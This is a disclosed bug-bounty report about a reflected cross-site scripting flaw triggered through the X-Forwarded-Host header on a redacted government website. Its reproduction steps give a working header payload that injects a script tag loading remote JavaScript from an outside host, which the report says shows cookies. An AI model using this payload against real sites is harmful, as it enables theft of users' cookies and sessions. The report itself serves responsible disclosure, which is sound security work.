# XSS via X-Forwarded-Host header

## Report Details
- **Report ID**: 882220
- **URL**: https://hackerone.com/reports/882220
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-05-25T12:52:39.230Z
- **Disclosed**: 2021-05-11T20:19:54.871Z

## Reporter
- **Username**: geeknik
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Summary:**
The `█████` website is vulnerable to a cross-site scripting flaw if the server receives a crafted `X-Forwarded-Host` header.

**Description:**
The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.

## Impact
This flaw allows attackers to pass rogue JavaScript to unsuspecting users. The user’s browser has no way to know the script should not be trusted, so it will execute the script and because the browser thinks the script came from a trusted source, aka your website, a malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with your site. These scripts can even rewrite the content of the HTML page. In fact, here is a list of 21 other things that hackers can do with an XSS flaw: https://s0md3v.github.io/21-things-xss/

## Step-by-step Reproduction Instructions
1.Visit `https://█████/████████/` whilst setting the `X-Fowarded-Host` header to `foo"><script src=//dtf.pw/2.js></script><x=".com`.
2. Notice the JavaScript alert box displaying some cookie information like so:
```
██████████_██████████=
```

## Product, Version, and Configuration (If applicable)

## Suggested Mitigation/Remediation Actions
Ignore invalid browser headers. Filter metacharacters from user input. Y'all know the drill.

## Impact

This flaw allows attackers to pass rogue JavaScript to unsuspecting users. The user’s browser has no way to know the script should not be trusted, so it will execute the script and because the browser thinks the script came from a trusted source, aka your website, a malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with your site. These scripts can even rewrite the content of the HTML page. In fact, here is a list of 21 other things that hackers can do with an XSS flaw: https://s0md3v.github.io/21-things-xss/

## Attachments
No attachments
